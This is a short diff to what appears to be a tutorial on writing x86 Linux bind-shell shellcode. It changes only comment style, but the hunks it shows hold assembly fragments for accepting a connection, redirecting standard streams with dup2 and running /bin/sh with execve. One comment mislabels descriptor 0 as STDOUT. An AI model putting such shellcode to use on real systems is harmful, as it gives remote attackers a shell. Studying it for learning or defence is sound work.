@@ -241,7 +241,7 @@ int 0x80            ; returns 0 in eax
 Call to `accept`
 
 ```nasm
-; // Accept Connection Requests on the Socket
+; Accept Connection Requests on the Socket
 ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 ; int connfd = accept(sockfd, NULL, NULL);
 push edx            ; NULL
@@ -262,7 +262,7 @@ Next, a system call to to `dup2` is required which is assigned the system call n
 ```
 
 ```nasm
-; // Direct Connection Socket Output
+; Direct Connection Socket Output
 ; int dup2(int oldfd, int newfd);
 ; dup2(connfd, 0);
 mov ecx, edx        ; 0 = STDOUT
@@ -287,7 +287,7 @@ Finally, a system call to `execve` needs to be made in order to execute `/bin/sh
 ```
 
 ```nasm
-; // Execute Program
+; Execute Program
 ; int execve(const char *pathname, char *const argv[], char *const envp[]);
 ; execve("/bin/sh", NULL, NULL);
 push edx            ; delimiting NULL for pathname
